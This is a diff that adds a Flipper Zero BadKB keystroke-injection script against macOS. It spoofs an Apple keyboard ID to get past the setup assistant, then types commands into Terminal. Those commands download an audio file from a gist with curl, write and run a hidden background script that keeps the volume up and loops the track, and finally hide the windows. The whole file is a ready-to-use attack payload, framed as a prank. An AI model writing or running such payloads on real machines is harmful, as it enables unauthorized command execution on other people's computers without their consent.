@@ -1,0 +1,63 @@
+ID 05ac:021e Apple:Keyboard
+REM Keep these 3 lines IF (and only if) it's the first time you are performing a badKB attack against a specific macOS target.
+REM In fact, it helps Flipper Zero bypass the macOS keyboard setup assistant. Otherwise the attack will not start.
+REM Author: 47LeCoste
+REM Version 1.0 (Flipper Ducky)
+REM Target: macOS
+
+DEFAULT_STRING_DELAY 10
+F4
+
+DELAY 500
+STRING terminal
+
+DELAY 500
+ENTER
+
+DELAY 1000
+GUI n
+
+DELAY 1000
+
+STRING cat > ~/.tmp << 'EOF'
+ENTER
+
+DELAY 100
+
+STRING rm ~/.tmp
+ENTER
+
+STRING curl -L https://gist.github.com/assets/14147217/f7094f73-9ba8-493c-abca-ac9a436fd85d -o ~/.config/track.mp4
+ENTER
+
+STRING touch ~/.prank
+ENTER
+
+STRING while :; do if [ -f ~/.prank ]; then osascript -e "set Volume 5"; sleep 1; else pkill afplay; break; fi; done & disown
+ENTER
+
+STRING sleep 10; while [ -f ~/.prank ]; do sleep 1; afplay ~/.config/track.mp4; done & disown
+ENTER
+
+STRING EOF
+ENTER
+
+DELAY 100
+
+STRING chmod +x ~/.tmp
+ENTER
+
+DELAY 100
+
+STRING ~/.tmp & disown
+ENTER
+
+DELAY 5000
+
+GUI w
+
+REM confirm end session
+DELAY 500
+ENTER
+
+GUI h
